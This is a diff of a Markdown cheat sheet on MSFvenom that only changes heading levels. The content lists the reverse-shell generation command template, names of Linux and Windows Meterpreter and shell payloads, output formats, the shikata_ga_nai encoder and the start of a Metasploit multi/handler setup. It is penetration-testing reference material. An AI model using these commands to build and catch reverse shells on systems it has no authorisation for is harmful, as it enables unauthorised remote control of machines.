@@ -11,7 +11,7 @@ tags:
     - shell
 ---
 # MSFvenom
-### General Reverse Shell Format
+## General Reverse Shell Format
 ```shell
 msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> -f <format> -e <encoder>
 ```
@@ -22,12 +22,12 @@ msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> -f <format> -e <encode
     - `seh` use where a structured exception handler (SEH) restarts the thread or process on error
     - `none`
 
-### Payloads
+## Payloads
 ```shell
 msfvenom -l payloads
 ```
 
-#### Linux
+### Linux
 ```shell
 linux/x64/meterpreter/bind_tcp            # Bind Meterpreter
 linux/x64/meterpreter_bind_tcp            # Bind Meterpreter (stageless)
@@ -39,7 +39,7 @@ linux/x64/shell/reverse_tcp               # Reverse shell
 ```
 - `x86` also available
 
-#### Windows
+### Windows
 ```shell
 windows/x64/meterpreter/reverse_tcp       # Reverse Meterpreter
 windows/x64/meterpreter_reverse_tcp       # Reverse Meterpreter (stageless)
@@ -58,21 +58,21 @@ windows/x64/exec                          # Execute command; use CMD=<cmd>
 ```
 - Remove `/x64` for x86
 
-### Formats
+## Formats
 ```shell
 msfvenom -l formats
 ```
-#### Executable
+### Executable
 ```shell
 asp, aspx, dll, elf, exe, jar, jsp, msi, psh, vba, vbs, war
 ```
 
-#### Transform
+### Transform
 ```shell
 bash, c, csharp, dword, hex, java, js_be, js_le, perl, powershell, python, raw, ruby, vbapplication, vbscript
 ```
 
-### Encoders
+## Encoders
 ```shell
 msfvenom -l encoders
 ```
@@ -81,7 +81,7 @@ x86/shikata_ga_nai                        # Polymorphic XOR Additive Feedback En
 ```
 - `-i` for number of iterations
 
-### Metasploit Handler
+## Metasploit Handler
 ```shell
 use exploit/multi/handler
 set PAYLOAD <payload>
